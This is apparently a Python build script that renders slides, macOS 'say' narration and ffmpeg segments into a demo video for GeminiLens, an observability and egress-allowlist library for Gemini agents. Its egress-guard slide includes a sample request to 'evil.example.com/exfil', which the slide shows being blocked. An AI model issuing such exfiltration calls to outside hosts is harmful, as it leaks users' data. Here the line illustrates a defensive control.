"""Build the GeminiLens demo video end-to-end:
  1. Render 8 slides to PNG (1920x1080)
  2. Generate per-slide narration audio with macOS `say`
  3. Compose each slide+audio into an MP4 segment with ffmpeg
  4. Concatenate segments into the final demo.mp4

Usage:
  /path/to/venv/python scripts/build_demo_video.py [outdir]
"""

from __future__ import annotations

import shutil
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from textwrap import wrap

from PIL import Image, ImageDraw, ImageFont


W, H = 1920, 1080
FG = "#0f172a"           # slate-900
FG_MUTED = "#475569"     # slate-600
ACCENT = "#2563eb"       # blue-600
ACCENT_2 = "#16a34a"     # green-600
BG = "#ffffff"
PANEL = "#f8fafc"        # slate-50
CODE_BG = "#0f172a"
CODE_FG = "#e2e8f0"

SF = "/System/Library/Fonts/SFNS.ttf"
SFI = "/System/Library/Fonts/SFNSItalic.ttf"
MONO = "/System/Library/Fonts/SFNSMono.ttf"
if not Path(MONO).exists():
    MONO = "/System/Library/Fonts/Menlo.ttc"


def font(size: int, mono: bool = False, italic: bool = False) -> ImageFont.FreeTypeFont:
    path = MONO if mono else (SFI if italic else SF)
    return ImageFont.truetype(path, size)


@dataclass
class Slide:
    name: str
    duration: float       # narration target seconds; ffmpeg will match audio
    narration: str
    draw: callable        # (img, draw) -> None


def base(img, d, title: str | None = None, eyebrow: str | None = None) -> None:
    """Draw the standard chrome (footer + eyebrow + title rule) onto img/d."""
    d.rectangle([(0, H - 56), (W, H)], fill=PANEL)
    d.text((48, H - 44), "GeminiLens", font=font(22), fill=FG)
    d.text((W - 510, H - 44), "github.com/MukundaKatta/geminilens", font=font(22), fill=FG_MUTED)
    if eyebrow:
        d.text((96, 80), eyebrow.upper(), font=font(26), fill=ACCENT)
    if title:
        d.text((96, 130), title, font=font(72), fill=FG)
        d.rectangle([(96, 230), (220, 236)], fill=ACCENT)


def draw_title(img, d):
    # Big title slide
    d.rectangle([(0, 0), (W, H)], fill=BG)
    d.rectangle([(0, H - 56), (W, H)], fill=PANEL)
    d.text((48, H - 44), "github.com/MukundaKatta/geminilens", font=font(22), fill=FG_MUTED)
    d.text((W - 270, H - 44), "Apache 2.0", font=font(22), fill=FG_MUTED)
    d.text((96, 340), "GeminiLens", font=font(160), fill=FG)
    d.rectangle([(96, 530), (340, 540)], fill=ACCENT)
    d.text((96, 580), "Local-first observability", font=font(56), fill=FG_MUTED)
    d.text((96, 650), "for Vertex AI Gemini agents.", font=font(56), fill=FG_MUTED)
    d.text((96, 800), "Live demo:", font=font(28), fill=FG_MUTED)
    d.text((96, 840), "geminilens-1029931682737.us-central1.run.app", font=font(36, mono=True), fill=ACCENT)


def draw_problem(img, d):
    base(img, d, title="The problem", eyebrow="Why GeminiLens")
    bullets = [
        ("Cost", "You can't tell which prompt is burning your Vertex AI bill."),
        ("Latency", "You can't see when p95 starts creeping up on a release."),
        ("Drift", "You can't see when the model's output gets longer or noisier."),
        ("Egress", "You can't audit which external hosts your agent's tools called."),
    ]
    y = 330
    for label, text in bullets:
        d.rectangle([(96, y), (140, y + 60)], fill=ACCENT)
        d.text((180, y), label, font=font(40), fill=FG)
        d.text((180, y + 60), text, font=font(34), fill=FG_MUTED)
        y += 165


def draw_solution(img, d):
    base(img, d, title="The solution", eyebrow="What it does")
    items = [
        "Wraps any Vertex AI Gemini client. Drop-in.",
        "Per-call USD cost from the published Gemini price table.",
        "Rolling-vs-baseline drift on latency, cost, and output length.",
        "httpx egress allowlist that throws on disallowed hosts.",
        "Streamlit dashboard, JSONL store, optional Dynatrace export.",
    ]
    y = 320
    for text in items:
        d.text((96, y), "•", font=font(48), fill=ACCENT)
        d.text((160, y), text, font=font(38), fill=FG)
        y += 90


def draw_code(img, d):
    base(img, d, title="Five-line API", eyebrow="Drop-in")
    code = (
        "from geminilens import GeminiObserver\n"
        "from google import genai\n"
        "\n"
        "observer = GeminiObserver()\n"
        "client = genai.Client(vertexai=True, project=\"my-project\")\n"
        "\n"
        "with observer.trace(model=\"gemini-2.5-flash\", prompt=q) as tr:\n"
        "    resp = client.models.generate_content(\n"
        "        model=\"gemini-2.5-flash\", contents=q,\n"
        "    )\n"
        "    observer.record_response(tr, resp)\n"
        "\n"
        "# Trace is now in observer.store with cost, latency, tokens."
    )
    box = [(96, 320), (W - 96, H - 130)]
    d.rounded_rectangle(box, radius=18, fill=CODE_BG)
    fnt = font(28, mono=True)
    yy = 350
    for line in code.split("\n"):
        d.text((130, yy), line, font=fnt, fill=CODE_FG)
        yy += 42


def draw_cost(img, d):
    base(img, d, title="Real cost math", eyebrow="Auditable")
    # The numbers below are from an actual gemini-2.5-flash call I ran.
    d.text((96, 320), "Live call: gemini-2.5-flash", font=font(40), fill=FG)
    d.text((96, 380), "Input: 40 tokens     Output: 6 tokens", font=font(32, mono=True), fill=FG_MUTED)
    d.text((96, 440), "    40 / 1M × $0.30  =  $0.000012", font=font(34, mono=True), fill=FG)
    d.text((96, 490), "  +  6 / 1M × $2.50  =  $0.000015", font=font(34, mono=True), fill=FG)
    d.text((96, 560), "    Total cost       =  $0.000027", font=font(36, mono=True), fill=ACCENT_2)
    d.text((96, 660), "Pricing table is checked into the repo,", font=font(32), fill=FG_MUTED)
    d.text((96, 700), "tied to ai.google.dev/gemini-api/docs/pricing.", font=font(32), fill=FG_MUTED)
    d.text((96, 800), "Cached-input tier is supported.", font=font(30, italic=True), fill=FG_MUTED)
    d.text((96, 845), "Tiered Pro pricing above 128K context is supported.", font=font(30, italic=True), fill=FG_MUTED)


def draw_dashboard(img, d):
    base(img, d, title="The dashboard", eyebrow="Live at the URL above")
    # Four top-line cards (real numbers from the deployed instance autoseed)
    metrics = [
        ("Traces", "50"),
        ("Total cost", "$0.0640"),
        ("p95 latency", "50 ms"),
        ("Error rate", "0.0%"),
    ]
    x = 96
    for label, value in metrics:
        d.rounded_rectangle([(x, 320), (x + 410, 470)], radius=16, fill=PANEL)
        d.text((x + 24, 340), label, font=font(28), fill=FG_MUTED)
        d.text((x + 24, 380), value, font=font(64), fill=FG)
        x += 430
    # Drift cards (also real)
    d.text((96, 510), "Drift report", font=font(40), fill=FG)
    drift = [
        ("Latency drift", "0.98x", "rolling p95 vs baseline"),
        ("Cost drift", "0.68x", "rolling mean vs baseline"),
        ("Output-length drift", "0.65x", "rolling mean vs baseline"),
    ]
    x = 96
    for label, value, sub in drift:
        d.rounded_rectangle([(x, 570), (x + 560, 760)], radius=16, fill=PANEL)
        d.text((x + 24, 590), label, font=font(28), fill=FG_MUTED)
        d.text((x + 24, 630), value, font=font(80), fill=ACCENT)
        d.text((x + 24, 720), sub, font=font(24), fill=FG_MUTED)
        x += 580
    d.text((96, 800), "All numbers above are from the live deployment, not mockups.",
           font=font(26, italic=True), fill=FG_MUTED)


def draw_guard(img, d):
    base(img, d, title="Egress allowlist", eyebrow="Tool audit")
    code = (
        "guard = EgressGuard(allow=[\"wikipedia.org\"])\n"
        "client = guard.client()\n"
        "\n"
        "client.get(\"https://en.wikipedia.org/wiki/X\")  # OK\n"
        "client.get(\"https://evil.example.com/exfil\")\n"
        "# → EgressBlocked: egress to evil.example.com blocked"
    )
    d.rounded_rectangle([(96, 320), (W - 96, 700)], radius=18, fill=CODE_BG)
    fnt = font(30, mono=True)
    yy = 360
    for line in code.split("\n"):
        color = "#ef4444" if "EgressBlocked" in line else CODE_FG
        d.text((130, yy), line, font=fnt, fill=color)
        yy += 46
    d.text((96, 760), "Subdomain match is supported. Violations are recorded.",
           font=font(30), fill=FG_MUTED)
    d.text((96, 810), "Useful for research and data-extraction agents.",
           font=font(30, italic=True), fill=FG_MUTED)


def draw_tests(img, d):
    base(img, d, title="Tested", eyebrow="19 / 19 passing")
    rows = [
        ("test_cost.py", "4 passed"),
        ("test_observer.py", "3 passed"),
        ("test_guard.py", "4 passed"),
        ("test_azure.py", "5 passed"),
        ("test_dynatrace_exporter.py", "3 passed"),
    ]
    y = 320
    for name, status in rows:
        d.text((96, y), "✓", font=font(40), fill=ACCENT_2)
        d.text((160, y), name, font=font(36, mono=True), fill=FG)
        d.text((900, y), status, font=font(36), fill=FG_MUTED)
        y += 78
    d.text((96, 800), "All 19 tests run in 0.09s. Pure stdlib for cost + drift math.",
           font=font(30, italic=True), fill=FG_MUTED)


def draw_close(img, d):
    d.rectangle([(0, 0), (W, H)], fill=BG)
    d.text((96, 200), "GeminiLens", font=font(120), fill=FG)
    d.rectangle([(96, 350), (340, 360)], fill=ACCENT)
    d.text((96, 400), "github.com/MukundaKatta/geminilens", font=font(48, mono=True), fill=ACCENT)
    d.text((96, 490), "geminilens-1029931682737.us-central1.run.app", font=font(40, mono=True), fill=ACCENT_2)
    d.text((96, 620), "Built for the Google Cloud Rapid Agent", font=font(38), fill=FG_MUTED)
    d.text((96, 670), "Hackathon, Dynatrace partner track.", font=font(38), fill=FG_MUTED)
    d.text((96, 820), "Apache 2.0. Mukunda Katta, independent.", font=font(30, italic=True), fill=FG_MUTED)


SLIDES = [
    Slide("01_title", 6.5,
          "Gemini Lens. Local first observability for Vertex AI Gemini agents.",
          draw_title),
    Slide("02_problem", 16.0,
          "Every Gemini project ends up with the same four problems once it leaves your laptop. "
          "You cant tell which prompt is burning your Vertex AI bill. You cant see when p ninety five "
          "latency starts creeping up. You cant see when the model gets noticeably more verbose. And you "
          "cant audit which external hosts your agents tools actually called.",
          draw_problem),
    Slide("03_solution", 18.0,
          "Gemini Lens is the smallest thing that solves all four. It wraps any Vertex AI Gemini client. "
          "It computes per call USD cost from the published price table. It reports drift on latency, "
          "cost, and output length. It enforces an egress allowlist on tool calls. And it ships with a "
          "Streamlit dashboard and an optional Dynatrace exporter.",
          draw_solution),
    Slide("04_code", 14.0,
          "The library is five lines of Python. You import Gemini Observer, you open a trace context, "
          "you call Gemini as normal, and you record the response. The trace now holds prompt, tokens, "
          "latency, cost, and tool calls.",
          draw_code),
    Slide("05_cost", 14.0,
          "The cost math is auditable. A real call to gemini two point five flash with forty input "
          "tokens and six output tokens costs zero point zero zero zero zero two seven dollars. "
          "Pricing table is in the repo. Cached input and over one twenty eight K tiers are supported.",
          draw_cost),
    Slide("06_dashboard", 16.0,
          "The Streamlit dashboard lives at the URL above. Fifty traces, six and a half cents in total "
          "Gemini cost, p ninety five latency around fifty milliseconds, zero error rate. The drift report "
          "splits the last twenty traces against the previous eighty. All numbers here are from the "
          "live deployment, not mockups.",
          draw_dashboard),
    Slide("07_guard", 12.0,
          "The egress guard is a custom h t t p x transport. If your tool tries to reach a host outside "
          "the allowlist, it throws egress blocked and records the violation. Useful for research agents "
          "that fetch documents from the open web.",
          draw_guard),
    Slide("08_tests", 11.0,
          "Nineteen tests cover cost, observer, guard, Azure adapter, and Dynatrace exporter. Pure "
          "standard library for the cost and drift math. All run in under a tenth of a second.",
          draw_tests),
    Slide("09_close", 8.0,
          "Gemini Lens. On Git Hub at Mukunda Katta slash gemini lens. Live demo at the dot run dot app "
          "URL on screen. Built for the Google Cloud Rapid Agent Hackathon, Dynatrace track. Thank you.",
          draw_close),
]


def render_slides(outdir: Path) -> list[Path]:
    paths: list[Path] = []
    for sl in SLIDES:
        img = Image.new("RGB", (W, H), BG)
        d = ImageDraw.Draw(img)
        sl.draw(img, d)
        p = outdir / f"{sl.name}.png"
        img.save(p, "PNG", optimize=True)
        paths.append(p)
        print(f"  rendered {p.name}")
    return paths


def render_audio(outdir: Path) -> list[Path]:
    paths: list[Path] = []
    for sl in SLIDES:
        wav = outdir / f"{sl.name}.aiff"
        m4a = outdir / f"{sl.name}.m4a"
        subprocess.run(
            ["say", "-v", "Samantha", "-r", "175", "-o", str(wav), sl.narration],
            check=True,
        )
        subprocess.run(
            ["ffmpeg", "-y", "-loglevel", "error", "-i", str(wav), "-c:a", "aac", "-b:a", "128k", str(m4a)],
            check=True,
        )
        wav.unlink(missing_ok=True)
        paths.append(m4a)
        print(f"  spoke   {m4a.name}")
    return paths


def render_segments(outdir: Path, slide_pngs: list[Path], audio_m4as: list[Path]) -> list[Path]:
    segs: list[Path] = []
    for sl, png, m4a in zip(SLIDES, slide_pngs, audio_m4as):
        out = outdir / f"seg_{sl.name}.mp4"
        # Get actual audio duration so the video matches the narration length.
        dur = subprocess.run(
            ["ffprobe", "-v", "error", "-show_entries", "format=duration",
             "-of", "default=noprint_wrappers=1:nokey=1", str(m4a)],
            capture_output=True, text=True, check=True,
        ).stdout.strip()
        # Add 0.4s of silent tail so transitions don't clip.
        seg_dur = float(dur) + 0.4
        subprocess.run([
            "ffmpeg", "-y", "-loglevel", "error",
            "-loop", "1", "-i", str(png),
            "-i", str(m4a),
            "-af", "apad=pad_dur=0.4",
            "-c:v", "libx264", "-tune", "stillimage", "-pix_fmt", "yuv420p",
            "-r", "30", "-t", f"{seg_dur:.2f}",
            "-c:a", "aac", "-b:a", "128k",
            "-shortest",
            str(out),
        ], check=True)
        segs.append(out)
        print(f"  segment {out.name}  ({seg_dur:.2f}s)")
    return segs


def concat(outdir: Path, segs: list[Path]) -> Path:
    list_file = outdir / "concat.txt"
    list_file.write_text("\n".join(f"file '{p.resolve()}'" for p in segs) + "\n")
    out = outdir / "demo.mp4"
    subprocess.run([
        "ffmpeg", "-y", "-loglevel", "error",
        "-f", "concat", "-safe", "0", "-i", str(list_file),
        "-c", "copy",
        str(out),
    ], check=True)
    return out


def main() -> None:
    outdir = Path(sys.argv[1]) if len(sys.argv) > 1 else Path.home() / "hackathon-agent-obs" / ".video-build"
    outdir.mkdir(parents=True, exist_ok=True)

    for needed in ("ffmpeg", "ffprobe", "say"):
        if shutil.which(needed) is None:
            sys.exit(f"missing tool: {needed}")

    print("[1/4] rendering slides...")
    slides = render_slides(outdir)
    print("[2/4] rendering audio (macOS say + ffmpeg aac)...")
    audios = render_audio(outdir)
    print("[3/4] rendering video segments...")
    segs = render_segments(outdir, slides, audios)
    print("[4/4] concatenating final MP4...")
    final = concat(outdir, segs)

    size = final.stat().st_size / (1024 * 1024)
    dur = subprocess.run(
        ["ffprobe", "-v", "error", "-show_entries", "format=duration",
         "-of", "default=noprint_wrappers=1:nokey=1", str(final)],
        capture_output=True, text=True,
    ).stdout.strip()
    print(f"\nDONE: {final}  ({size:.1f} MB, {float(dur):.1f}s)")


if __name__ == "__main__":
    main()
